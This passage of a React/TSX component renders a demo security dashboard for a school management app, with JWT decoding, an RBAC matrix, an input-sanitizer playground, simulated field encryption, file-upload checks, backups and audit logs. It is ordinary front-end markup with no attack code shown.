                    </div>
                  </div>
                </div>

                <div className="space-y-1">
                  <span className="text-[9px] font-black text-slate-400 uppercase block">Signed Base64 encoded Token</span>
                  <div className="bg-slate-900 border border-slate-850 p-3 rounded-xl font-mono text-[9px] text-amber-400 break-all leading-normal flex items-start gap-2 select-all">
                    <span className="flex-1">{generatedToken}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Token Decoder Panel */}
            <div className="xl:col-span-6 space-y-4 border border-slate-200 rounded-2xl p-5 bg-white">
              <div className="flex justify-between items-center">
                <div>
                  <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                    <Binary className="h-4 w-4 text-emerald-600" />
                    JWT Decoder & Signature Verifier
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">Decrypt, decode base64, and dynamically check signatures or check expiration dates.</p>
                </div>
                {decodedValidity !== 'unverified' && (
                  <span className={`px-2.5 py-1 text-[9px] font-black rounded-lg border uppercase tracking-wider ${
                    decodedValidity === 'valid' ? 'bg-emerald-50 border-emerald-200 text-emerald-700' :
                    decodedValidity === 'expired' ? 'bg-amber-50 border-amber-200 text-amber-700' :
                    'bg-rose-50 border-rose-200 text-rose-700'
                  }`}>
                    {decodedValidity === 'valid' ? '● Verified Signature' :
                     decodedValidity === 'expired' ? '● Token Expired' : '● Revoked / Bad Sig'}
                  </span>
                )}
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Paste JWT Token to Verify</label>
                  <textarea
                    rows={2}
                    value={inputTokenToDecode}
                    onChange={(e) => {
                      setInputTokenToDecode(e.target.value);
                      handleDecodeToken(e.target.value);
                    }}
                    placeholder="eyJhbGciOi..."
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-[10px] font-mono text-slate-700 focus:outline-emerald-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <span className="text-[9px] font-black text-indigo-500 uppercase block">Header (ALGORITHM)</span>
                    <pre className="bg-slate-950 text-indigo-400 p-3 rounded-xl text-[9px] font-mono h-[140px] overflow-auto border border-slate-900 leading-normal">
                      {decodedHeader || '// Waiting for token inputs'}
                    </pre>
                  </div>

                  <div className="space-y-1">
                    <span className="text-[9px] font-black text-emerald-600 uppercase block">Payload (CLAIMS)</span>
                    <pre className="bg-slate-950 text-emerald-400 p-3 rounded-xl text-[9px] font-mono h-[140px] overflow-auto border border-slate-900 leading-normal">
                      {decodedPayload || '// Waiting for token inputs'}
                    </pre>
                  </div>
                </div>

                <div className="flex gap-2">
                  <button
                    onClick={() => handleDecodeToken(inputTokenToDecode)}
                    className="flex-1 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center justify-center gap-1"
                  >
                    <RefreshCw className="h-3 w-3" /> Re-verify Token Signature
                  </button>
                  <button
                    onClick={handleRevokeToken}
                    className="py-2 px-4 border border-rose-200 text-rose-600 hover:bg-rose-50 rounded-xl text-xs font-bold transition-all cursor-pointer"
                  >
                    Revoke Token
                  </button>
                </div>

                {/* Simulated Blacklisted Display */}
                {blacklistedTokens.length > 0 && (
                  <div className="border border-slate-200 rounded-xl p-3 bg-slate-50">
                    <span className="text-[8px] font-black text-rose-600 uppercase block tracking-wider mb-1">Server Blacklisted Tokens ({blacklistedTokens.length})</span>
                    <div className="text-[8px] font-mono text-slate-400 select-all leading-normal max-h-[50px] overflow-y-auto">
                      {blacklistedTokens.map((t, i) => (
                        <div key={i} className="line-clamp-1 border-b border-slate-100 py-0.5">Revoked: ...{t.substring(t.length - 20)}</div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab: Role-Based Authorization */}
      {activeTab === 'rbac' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Roles Permissions Grid */}
            <div className="lg:col-span-8 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div>
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Access Control Matrix (RBAC)</h3>
                <p className="text-[10px] text-slate-400 font-semibold">Review allowed operations linked directly to system roles.</p>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-slate-200">
                      <th className="py-2.5 text-[10px] font-black text-slate-400 uppercase">Operation Descriptor</th>
                      <th className="py-2.5 text-[10px] font-black text-slate-400 uppercase text-center bg-indigo-50/20 text-indigo-700">Admin</th>
                      <th className="py-2.5 text-[10px] font-black text-slate-400 uppercase text-center">Teacher</th>
                      <th className="py-2.5 text-[10px] font-black text-slate-400 uppercase text-center">Student</th>
                      <th className="py-2.5 text-[10px] font-black text-slate-400 uppercase text-center bg-emerald-50/20 text-emerald-700">Accountant</th>
                      <th className="py-2.5 text-[10px] font-black text-slate-400 uppercase text-center">Librarian</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 text-xxs font-bold text-slate-700">
                    {PERMISSIONS_MATRIX.map((perm, idx) => (
                      <tr key={idx} className="hover:bg-slate-50/50">
                        <td className="py-3 pr-2">
                          <span className="block font-black text-slate-800">{perm.action}</span>
                          <span className="text-[8px] text-slate-400 uppercase">Module: {perm.module}</span>
                        </td>
                        <td className="py-3 text-center bg-indigo-50/10">
                          {perm.allowedRoles.includes('admin') ? (
                            <Check className="h-4 w-4 text-emerald-600 mx-auto" />
                          ) : (
                            <X className="h-4 w-4 text-slate-350 mx-auto" />
                          )}
                        </td>
                        <td className="py-3 text-center">
                          {perm.allowedRoles.includes('teacher') ? (
                            <Check className="h-4 w-4 text-emerald-600 mx-auto" />
                          ) : (
                            <X className="h-4 w-4 text-slate-350 mx-auto" />
                          )}
                        </td>
                        <td className="py-3 text-center">
                          {perm.allowedRoles.includes('student') ? (
                            <Check className="h-4 w-4 text-emerald-600 mx-auto" />
                          ) : (
                            <X className="h-4 w-4 text-slate-350 mx-auto" />
                          )}
                        </td>
                        <td className="py-3 text-center bg-emerald-50/10">
                          {perm.allowedRoles.includes('accountant') ? (
                            <Check className="h-4 w-4 text-emerald-600 mx-auto" />
                          ) : (
                            <X className="h-4 w-4 text-slate-350 mx-auto" />
                          )}
                        </td>
                        <td className="py-3 text-center">
                          {perm.allowedRoles.includes('librarian') ? (
                            <Check className="h-4 w-4 text-emerald-600 mx-auto" />
                          ) : (
                            <X className="h-4 w-4 text-slate-350 mx-auto" />
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Impersonator Sandbox */}
            <div className="lg:col-span-4 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1">
                  <span>🎭</span> RBAC Sandbox Tester
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Simulate user actions to test real-time route authorization logic.</p>
              </div>

              <div className="space-y-3.5">
                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Select Active Role to Impersonate</label>
                  <select
                    value={selectedImpersonatedRole}
                    onChange={(e) => {
                      setSelectedImpersonatedRole(e.target.value as any);
                      setSandboxActionResponse(null);
                    }}
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-xs font-black text-indigo-900 focus:outline-indigo-500"
                  >
                    <option value="admin">Admin Root</option>
                    <option value="teacher">Class Teacher</option>
                    <option value="student">Student Account</option>
                    <option value="accountant">Institute Accountant</option>
                    <option value="librarian">Librarian Office</option>
                  </select>
                </div>

                <div className="space-y-1.5 pt-2">
                  <span className="text-[9px] font-black text-slate-400 uppercase block mb-1">Dispatch Virtual API Calls</span>
                  <div className="grid grid-cols-1 gap-1.5 max-h-[180px] overflow-y-auto pr-1">
                    {PERMISSIONS_MATRIX.map((perm, idx) => (
                      <button
                        key={idx}
                        onClick={() => testActionAuthorization(perm.action)}
                        className="py-2 px-3 text-left border border-slate-150 rounded-xl hover:bg-slate-50 transition-all text-xxs font-black text-slate-700 flex justify-between items-center cursor-pointer"
                      >
                        <span>{perm.action}</span>
                        <span className="text-[8px] font-mono text-indigo-500 font-bold">Try Call →</span>
                      </button>
                    ))}
                  </div>
                </div>

                {sandboxActionResponse && (
                  <div className={`p-4 rounded-xl space-y-1.5 border leading-relaxed font-mono text-[9px] ${
                    sandboxActionResponse.status === 'AUTHORIZED' 
                      ? 'bg-emerald-50 border-emerald-150 text-emerald-800' 
                      : 'bg-rose-50 border-rose-150 text-rose-800'
                  }`}>
                    <div className="flex justify-between font-black border-b pb-1">
                      <span>API INTERCEPTOR LOG</span>
                      <span>{sandboxActionResponse.status}</span>
                    </div>
                    <p>{sandboxActionResponse.message}</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab: Input Validation & Sanitization */}
      {activeTab === 'validation' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            {/* Sanitization Input */}
            <div className="xl:col-span-6 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                  <Sliders className="h-4 w-4 text-indigo-600" />
                  WAF Input Sanitizer & Validation Playground
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Type scripts, malicious tags, or SQL comments to check input sanitization.</p>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Preset Security Attack Vectors (Click to load)</label>
                  <div className="flex flex-wrap gap-1.5">
                    {ATTACK_VECTORS.map((at, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => triggerInputSanitization(at.payload)}
                        className="px-2.5 py-1.5 bg-slate-50 border border-slate-250 hover:bg-indigo-50 hover:border-indigo-200 text-slate-700 rounded-xl text-[9px] font-bold transition-all cursor-pointer"
                      >
                        {at.name}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Write / Edit Raw Test String</label>
                  <textarea
                    rows={4}
                    value={inputToValidate}
                    onChange={(e) => triggerInputSanitization(e.target.value)}
                    placeholder="Enter names, emails, or paste complex HTML/SQL payloads..."
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 text-xxs font-mono text-slate-800 focus:outline-indigo-500 focus:ring-1 focus:ring-indigo-500"
                  />
                </div>
              </div>
            </div>

            {/* Sanitization Output & Rules */}
            <div className="xl:col-span-6 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="flex justify-between items-center">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                  <ShieldCheck className="h-4 w-4 text-emerald-600" />
                  Sanitizer Analysis Engine
                </h3>
                {inputToValidate && (
                  <span className={`px-2.5 py-1 text-[9px] font-black rounded-lg border uppercase ${
                    sanitizedResult.isSafe 
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-700' 
                      : 'bg-rose-50 border-rose-200 text-rose-700 animate-pulse'
                  }`}>
                    {sanitizedResult.isSafe ? '● Safe String' : '● Security Threat Blocked'}
                  </span>
                )}
              </div>

              <div className="space-y-3">
                <div className="space-y-1">
                  <span className="text-[9px] font-black text-slate-400 uppercase block">Sanitized Secure Result (Database Safe)</span>
                  <div className="bg-slate-900 border border-slate-850 p-4 rounded-xl font-mono text-[10px] text-emerald-400 whitespace-pre-wrap leading-relaxed min-h-[100px]">
                    {sanitizedResult.sanitized || '// Waiting for text inputs'}
                  </div>
                </div>

                {sanitizedResult.detectedThreats.length > 0 && (
                  <div className="border border-rose-150 rounded-xl p-3.5 bg-rose-50/50 space-y-1.5">
                    <span className="text-[9px] font-black text-rose-700 uppercase tracking-wider block flex items-center gap-1">
                      <AlertTriangle className="h-3.5 w-3.5 text-rose-600" />
                      Deflected Cyber Threats ({sanitizedResult.detectedThreats.length})
                    </span>
                    <ul className="text-xxs font-bold text-rose-850 list-disc list-inside space-y-0.5">
                      {sanitizedResult.detectedThreats.map((t, i) => (
                        <li key={i}>{t}</li>
                      ))}
                    </ul>
                  </div>
                )}

                <div className="border border-slate-150 p-3 bg-slate-50/80 rounded-xl space-y-1">
                  <span className="text-[9px] font-black text-slate-500 uppercase tracking-wider block">WAF Validation Configuration Rules</span>
                  <div className="text-xxs font-bold text-slate-650 space-y-1 leading-normal">
                    <div>• Parameterized Query Translation on all SQL tokens</div>
                    <div>• Strict HTML tag stripping & character entity conversion</div>
                    <div>• Dynamic length validation limiting entries under 150 chars</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab: Cryptographic Field Encryption */}
      {activeTab === 'encryption' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            <div className="xl:col-span-6 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                  <Binary className="h-4 w-4 text-indigo-600" />
                  Field-Level Cryptography Playground
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Encrypt and decrypt sensitive personal data records using simulated AES-256-GCM.</p>
              </div>

              <div className="space-y-3.5">
                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Cryptographic Secret Passphrase</label>
                  <input
                    type="password"
                    value={encryptionKey}
                    onChange={(e) => setEncryptionKey(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-xs font-mono text-slate-800"
                  />
                </div>

                <div>
                  <label className="block text-[9px] font-black text-slate-500 uppercase mb-1">Enter Sensitive Plain Text (e.g., Aadhar or Bank ID)</label>
                  <input
                    type="text"
                    value={plainTextField}
                    onChange={(e) => setPlainTextField(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-200 rounded-xl p-2.5 text-xs font-semibold text-slate-800"
                  />
                </div>

                <div className="flex gap-2">
                  <button
                    onClick={triggerEncryption}
                    className="flex-1 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl text-xs font-bold transition-all cursor-pointer"
                  >
                    🔐 Encrypt Text
                  </button>
                  {encryptedPackage && (
                    <button
                      onClick={triggerDecryption}
                      className="py-2 px-5 border border-slate-200 hover:bg-slate-50 rounded-xl text-xs font-bold transition-all cursor-pointer"
                    >
                      🔓 Decrypt Cipher
                    </button>
                  )}
                </div>
              </div>
            </div>

            <div className="xl:col-span-6 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Storage Database Structure</h3>
              
              <div className="space-y-4">
                <div className="space-y-1">
                  <span className="text-[9px] font-black text-slate-400 uppercase block">Encrypted Database Payload JSON</span>
                  <div className="bg-slate-900 border border-slate-850 p-4 rounded-xl font-mono text-[9px] text-slate-300 leading-normal max-h-[140px] overflow-y-auto">
                    {encryptedPackage ? (
                      <pre className="text-amber-300">
{`{
  "attribute_name": "national_id",
  "encryption_level": "Field_Level_AES256",
  "ciphertext": "${encryptedPackage.cipherHex}",
  "iv_hex": "${encryptedPackage.iv}",
  "auth_tag_hex": "${encryptedPackage.tag}",
  "cipher_suite": "AES-256-GCM"
}`}
                      </pre>
                    ) : (
                      <span className="text-slate-500 font-semibold">// Waiting for encryption trigger</span>
                    )}
                  </div>
                </div>

                {decryptedOutput && (
                  <div className="border border-emerald-150 rounded-xl p-3.5 bg-emerald-50/50 space-y-1">
                    <span className="text-[9px] font-black text-emerald-700 uppercase tracking-wider block flex items-center gap-1">
                      <CheckCircle className="h-3.5 w-3.5" />
                      Authenticated Decrypted Output
                    </span>
                    <span className="text-xs font-mono font-black text-emerald-900 block">{decryptedOutput}</span>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab: Secure File Uploads */}
      {activeTab === 'upload' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            <div className="xl:col-span-6 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                  <Upload className="h-4 w-4 text-indigo-600" />
                  Upload Sanitizer Gatekeeper
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Test file upload safety checking. Upload real or drag-simulated files below.</p>
              </div>

              {/* Simulated Files Preset */}
              <div className="space-y-3.5">
                <div>
                  <span className="text-[9px] font-black text-slate-500 uppercase block mb-1.5">Select a file upload type to simulate</span>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                    <button
                      onClick={() => simulateFileDrag("passport_photo.jpg", 145000, "image/jpeg")}
                      className="p-3 text-left border border-slate-150 rounded-xl hover:border-indigo-300 hover:bg-slate-50 transition-all text-xxs font-bold text-slate-700 flex justify-between items-center cursor-pointer"
                    >
                      <span className="font-bold">📸 Safe Passport Photo</span>
                      <span className="text-[9px] font-mono text-slate-400">141 KB (JPEG)</span>
                    </button>

                    <button
                      onClick={() => simulateFileDrag("malicious_shell.php", 12000, "text/plain")}
                      className="p-3 text-left border border-slate-150 rounded-xl hover:border-indigo-300 hover:bg-slate-50 transition-all text-xxs font-bold text-slate-700 flex justify-between items-center cursor-pointer"
                    >
                      <span className="font-bold text-rose-600">⚠️ Hack Shell Script</span>
                      <span className="text-[9px] font-mono text-slate-400">12 KB (PHP)</span>
                    </button>

                    <button
                      onClick={() => simulateFileDrag("curriculum_vitae.pdf", 4500000, "application/pdf")}
                      className="p-3 text-left border border-slate-150 rounded-xl hover:border-indigo-300 hover:bg-slate-50 transition-all text-xxs font-bold text-slate-700 flex justify-between items-center cursor-pointer"
                    >
                      <span className="font-bold">📄 Over-sized Resume</span>
                      <span className="text-[9px] font-mono text-slate-400">4.5 MB (PDF)</span>
                    </button>

                    <button
                      onClick={() => simulateFileDrag("spoofed_homework.pdf.sh", 8500, "application/pdf")}
                      className="p-3 text-left border border-slate-150 rounded-xl hover:border-indigo-300 hover:bg-slate-50 transition-all text-xxs font-bold text-slate-700 flex justify-between items-center cursor-pointer"
                    >
                      <span className="font-bold text-rose-600">🛑 Double Ext Spoof</span>
                      <span className="text-[9px] font-mono text-slate-400">8 KB (.sh)</span>
                    </button>
                  </div>
                </div>

                {/* Real File Input for actual verification */}
                <div className="border-2 border-dashed border-slate-200 hover:border-indigo-400 rounded-2xl p-6 text-center space-y-2 bg-slate-50/50 cursor-pointer transition-all">
                  <div className="h-10 w-10 bg-indigo-50 border border-indigo-100 rounded-full flex items-center justify-center mx-auto text-indigo-500">
                    <Upload className="h-5 w-5" />
                  </div>
                  <div>
                    <span className="text-xxs font-black text-slate-800 uppercase block">Verify actual computer file</span>
                    <p className="text-[9px] text-slate-400 mt-0.5">Drag & drop files or click to run security inspection</p>
                  </div>
                  <input
                    type="file"
                    onChange={(e) => {
                      if (e.target.files && e.target.files[0]) {
                        const file = e.target.files[0];
                        simulateFileDrag(file.name, file.size, file.type || 'unknown/binary');
                      }
                    }}
                    className="hidden"
                    id="real-sec-upload"
                  />
                  <label htmlFor="real-sec-upload" className="inline-block py-1 px-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-[9px] font-bold cursor-pointer">
                    Inspect Local File
                  </label>
                </div>
              </div>
            </div>

            <div className="xl:col-span-6 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Gatekeeper Inspection Records</h3>

              {selectedFileToUpload ? (
                <div className="space-y-4">
                  <div className="border border-slate-100 p-4 rounded-xl bg-slate-50 space-y-2">
                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Inspected File Metadata</span>
                    <div className="text-xxs font-mono space-y-1 text-slate-700 font-semibold">
                      <div>File Name: <strong className="text-slate-800">{selectedFileToUpload.name}</strong></div>
                      <div>Byte Size: <strong className="text-slate-800">{selectedFileToUpload.size} bytes</strong></div>
                      <div>Declared MIME: <strong className="text-slate-800">{selectedFileToUpload.type}</strong></div>
                      <div>Detected Ext: <strong className="text-slate-800">.{selectedFileToUpload.rawExt}</strong></div>
                    </div>
                  </div>

                  {uploadFeedback && (
                    <div className={`p-4 rounded-xl space-y-1.5 border leading-relaxed ${
                      uploadFeedback.status === 'VALID'
                        ? 'bg-emerald-50 border-emerald-150 text-emerald-800'
                        : 'bg-rose-50 border-rose-150 text-rose-800'
                    }`}>
                      <div className="flex justify-between items-center font-black text-[10px] uppercase border-b pb-1.5">
                        <span className="flex items-center gap-1">
                          {uploadFeedback.status === 'VALID' ? <CheckCircle className="h-4 w-4 text-emerald-600" /> : <XCircle className="h-4 w-4 text-rose-600" />}
                          Gatekeeper Verdict: {uploadFeedback.status}
                        </span>
                      </div>
                      <div className="text-xxs space-y-1 font-bold">
                        {uploadFeedback.reasons.map((reason, i) => (
                          <div key={i} className="flex items-start gap-1">
                            <span>•</span>
                            <span>{reason}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  <div className="border border-slate-150 p-3 bg-slate-50/85 rounded-xl space-y-1.5">
                    <span className="text-[9px] font-black text-slate-500 uppercase tracking-wider block">Enterprise Mitigation Safeguards</span>
                    <div className="text-[9px] text-slate-600 leading-normal space-y-1">
                      <div>• Filenames randomized to dynamic UUIDs to block directory traversal attacks</div>
                      <div>• Blocked execution of files by forcing non-executable header rules</div>
                      <div>• Byte signatures validated dynamically using magic bytes signature matches</div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="text-slate-500 text-center py-12 font-semibold">
                  // Drag or select file details to inspect security logs.
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Tab: Backups & Restore */}
      {activeTab === 'backup' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
            {/* Generate & History */}
            <div className="xl:col-span-7 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="flex justify-between items-center">
                <div>
                  <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider">Disaster Recovery & Snapshots</h3>
                  <p className="text-[10px] text-slate-400 font-semibold">Generate full-integrity snapshots containing admissions, notices, routes, and libraries.</p>
                </div>
                <button
                  onClick={handleGenerateBackup}
                  className="py-2 px-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1"
                >
                  <Download className="h-4 w-4" /> Export Backup (.json)
                </button>
              </div>

              <div className="space-y-3 pt-2">
                <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Stored Snapshot History</span>
                <div className="space-y-2">
                  {systemBackups.map((bk) => (
                    <div key={bk.id} className="border border-slate-150 rounded-xl p-3 bg-slate-50 flex items-center justify-between text-xxs font-semibold">
                      <div className="space-y-0.5">
                        <h4 className="font-black text-slate-800">{bk.fileName}</h4>
                        <p className="text-slate-400 text-[9px]">Created: {bk.timestamp} | Elements logged: {bk.recordCount} records</p>
                      </div>
                      <div className="text-right">
                        <span className="px-2 py-1 bg-white border border-slate-200 text-indigo-700 rounded-lg text-[9px] font-mono block">
                          Check: {bk.integrityChecksum}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Restore Panel */}
            <div className="xl:col-span-5 border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1">
                  <span>📥</span> Restore Database State
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Revert admissions records or batch rosters from validated archive dumps.</p>
              </div>

              <div
                onDragOver={handleDragOver}
                onDrop={handleDropRestoreFile}
                className="border-2 border-dashed border-slate-200 hover:border-emerald-500 rounded-2xl p-8 text-center space-y-3 bg-slate-50/50 cursor-pointer transition-all"
              >
                <div className="h-10 w-10 bg-emerald-50 border border-emerald-100 rounded-full flex items-center justify-center mx-auto text-emerald-500">
                  <Database className="h-5 w-5" />
                </div>
                <div>
                  <span className="text-xxs font-black text-slate-800 uppercase block">Drop Backup (.json) here</span>
                  <p className="text-[9px] text-slate-400 mt-0.5">Loads backup config schemas to execute restoration safely</p>
                </div>
                <input
                  type="file"
                  accept=".json"
                  onChange={(e) => {
                    if (e.target.files && e.target.files[0]) {
                      processRestoreFile(e.target.files[0]);
                    }
                  }}
                  className="hidden"
                  id="real-sec-restore"
                />
                <label htmlFor="real-sec-restore" className="inline-block py-1.5 px-4 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-[10px] font-bold cursor-pointer">
                  Select Backup File
                </label>
              </div>

              <div className="border border-slate-150 p-3 bg-slate-50 rounded-xl space-y-1 text-xxs leading-normal text-slate-500">
                <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Integrity Verification Flow</span>
                <div>1. Reads the exported checksum key</div>
                <div>2. Parses structure schema matches</div>
                <div>3. Fully rolls back student registries only upon success</div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab: Tamper-Proof Audit & Session Logs */}
      {activeTab === 'audit' && (
        <div className="space-y-6">
          {/* Active Sessions HUD */}
          <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
            <div className="flex justify-between items-center">
              <div>
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                  <Fingerprint className="h-4 w-4 text-indigo-600" />
                  Active User Session Auditor
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Monitor real-time authorization states of active accounts across regional devices.</p>
              </div>
              <span className="text-[10px] font-black bg-indigo-50 text-indigo-700 px-2.5 py-1 rounded-lg">
                Total active: {activeSessions.length}
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {activeSessions.map((sess) => (
                <div key={sess.id} className="border border-slate-150 rounded-xl p-3.5 bg-slate-50 space-y-3 text-xxs font-semibold">
                  <div className="flex justify-between items-start">
                    <div className="space-y-0.5">
                      <span className="text-[9px] font-black text-slate-400 uppercase tracking-wider block">Session Endpoint</span>
                      <strong className="text-slate-800 block truncate">{sess.user}</strong>
                    </div>
                    <span className="px-2 py-0.5 bg-white border border-slate-200 text-indigo-600 rounded text-[8px] font-black uppercase">
                      {sess.role}
                    </span>
                  </div>

                  <div className="space-y-0.5 text-slate-550 leading-relaxed font-bold">
                    <div>🖥️ Device: {sess.device}</div>
                    <div>📍 Geo IP: {sess.ip} ({sess.location})</div>
                    <div>⏳ State: {sess.lastActive}</div>
                  </div>

                  <button
                    onClick={() => handleRevokeSession(sess.id, sess.user)}
                    className="w-full py-1.5 border border-rose-200 text-rose-600 hover:bg-rose-50 rounded-lg text-[9px] font-bold transition-all cursor-pointer"
                  >
                    Force Logout (Revoke Token)
                  </button>
                </div>
              ))}
            </div>
          </div>

          {/* SHA-256 Chain Audits */}
          <div className="border border-slate-200 rounded-2xl p-5 bg-white space-y-4">
            <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-4">
              <div>
                <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-1">
                  <span>⛓️</span> Tamper-Proof Cryptographic Audit Trail
                </h3>
                <p className="text-[10px] text-slate-400 font-semibold">Each administrative action is chained using simulated SHA-256 hashes.</p>
              </div>

              <div className="flex gap-2">
                <input
                  type="text"
                  placeholder="Filter actor or action..."
                  value={searchAuditQuery}
                  onChange={(e) => setSearchAuditQuery(e.target.value)}
                  className="bg-slate-50 border border-slate-200 rounded-xl px-3 py-1.5 text-xxs focus:outline-indigo-500 font-semibold"
                />

                <button
                  onClick={verifyAuditLogChain}
                  disabled={integrityChecking}
                  className="py-1.5 px-3 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xxs font-bold transition-all cursor-pointer flex items-center gap-1 disabled:opacity-50"
                >
                  {integrityChecking ? "Checking Hashing..." : "Verify Chain Integrity"}
                </button>
              </div>
            </div>

            {/* Integrity Status HUD */}
            {integrityChecking && (
              <div className="bg-emerald-50 border border-emerald-150 text-emerald-800 p-3 rounded-xl text-xxs flex items-center gap-2 font-bold animate-pulse">
                <RefreshCw className="h-4 w-4 animate-spin text-emerald-600" />
                <span>Simulating SHA-256 Blockchain validation checks across all logs...</span>
              </div>
            )}

            {integrityVerified && !integrityChecking && (
              <div className="bg-emerald-100 border border-emerald-250 text-emerald-900 p-3 rounded-xl text-xxs flex items-center gap-2 font-black">
                <Check className="h-4 w-4 text-emerald-600 font-black" />
                <span>Audit trail integrity verified successfully. 100% of blocks correspond perfectly to the original signature chain.</span>
              </div>
            )}

            {/* Logs Table */}
            <div className="overflow-x-auto max-h-[250px] overflow-y-auto scrollbar-thin">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b border-slate-200">
                    <th className="py-2 text-[9px] font-black text-slate-400 uppercase">Timestamp</th>
                    <th className="py-2 text-[9px] font-black text-slate-400 uppercase">Actor Info</th>
                    <th className="py-2 text-[9px] font-black text-slate-400 uppercase">Action Logged</th>
                    <th className="py-2 text-[9px] font-black text-slate-400 uppercase">Target Resource</th>
                    <th className="py-2 text-[9px] font-black text-slate-400 uppercase text-center">Status</th>
                    <th className="py-2 text-[9px] font-black text-slate-400 uppercase text-right">Blockchain Hash</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 text-xxs font-bold text-slate-650">
                  {auditLogs
                    .filter(log => {
                      const q = searchAuditQuery.toLowerCase();
                      return log.actor.toLowerCase().includes(q) || log.action.toLowerCase().includes(q) || log.resource.toLowerCase().includes(q);
                    })
                    .map((log) => (
                      <tr key={log.id} className="hover:bg-slate-50/50">
                        <td className="py-2.5 font-mono text-slate-400 text-[9px]">{log.timestamp}</td>
                        <td className="py-2.5">
                          <span className="block text-slate-800">{log.actor}</span>
